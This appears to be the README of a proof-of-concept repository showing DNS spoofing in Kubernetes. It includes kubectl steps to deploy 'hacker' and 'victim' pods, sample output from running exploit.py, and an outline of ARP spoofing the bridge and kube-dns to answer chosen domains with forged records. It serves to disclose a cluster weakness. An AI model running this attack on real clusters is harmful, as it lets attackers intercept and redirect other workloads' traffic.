# Kube-Dnsspoof

Kube-dnsspoof is a POC for the possibility of DNS spoofing in certain circumstances on kubernetes clusters.
This exploit runs with minimum capabilities, on default installations of kuberentes.

This repository contains all files and related code for running this exploit.  


## Prerequisites
A Kubernetes cluster


## Run the exploit
  
First, create the pods by:
    
```bash
$ kubectl create -f pods/
pod/hacker created     
pod/victim created   
```

After the pod was created, exec into the hacker pod. it will contain the exploit and hosts file inside the /dnsspoof folder.

```zsh
$ kubectl exec -it hacker zsh
➜  hacker /dnsspoof ls
exploit.py  hosts
➜  hacker /dnsspoof 
```

Next, edit the hosts file to contain your spoofed domains.
The script will proxy all DNS requests to the real kube-dns pod, except for the entries in the hosts file.  

Example for successful run of the exploit:
```zsh
➜  hacker /dnsspoof ./exploit.py
[*] starting attack on indirect mode
Bridge:  172.17.0.1 c0:0f:fe:eb:4b:e0
Kube-dns:  172.17.0.4 02:42:bb:76:74:f8

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

The steps of the exploit:
* Deciding whether it can run
* Discovering relevant mac/ip addresses
* ARP spoofing the bridge (and kube-dns in case of direct attack mode)
* DNS proxy requests, and spoofing relevant entries
* Restoring all network on CTRL+C interrupt

